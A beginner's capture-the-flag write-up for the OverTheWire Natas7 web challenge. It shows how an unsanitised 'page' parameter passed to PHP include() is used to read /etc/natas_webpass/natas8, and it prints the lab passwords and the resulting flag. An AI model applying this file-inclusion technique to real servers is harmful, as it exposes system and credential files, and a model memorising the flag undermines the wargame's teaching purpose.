# CTF Writeup - **OverTheWire Natas6 - Natas7**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas6 - Natas7
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 2-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL:      http://natas7.natas.labs.overthewire.org
```

After logging in, we can see that the webpage has 2 entities. `Home` and `about` when we click on then it just show that `this is the front page` and `this is the about page` respectively. This isnt very helpful for us to find the flag. So lets inspect element and see if we can find anything. This is also not very helpful. But there is something interesting in the url, when we click home it changes the `index.php?page=home` and when we click `about` the url changes to `index.php?page=about`. Lets try and see if there are any other files by changes the url to `/`.

```bash
http://natas7.natas.labs.overthewire.org/index.php?page=about
http://natas7.natas.labs.overthewire.org/index.php?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=/

# Home About
# Warning: include(/): failed to open stream: Not a directory in /var/www/natas/natas7/index.php on line 21
# Warning: include(): Failed opening '/' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
```

Here we can see that it says there is nothing named / in the current directory. It also gives us the information on which directory its seaching for. With this we can use it to find the password which is stored in `/etc/natas_webpass/natas8` in the server. This clue was given first challenge description itself. Now Lets try to access this particular file by inputing it in the url.

```bash
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
# Access granted. The password for natas8 is xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

## Flag

**Flag:** xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

---

## Lessons Learned

It was a good challenge where i learned about url injection.
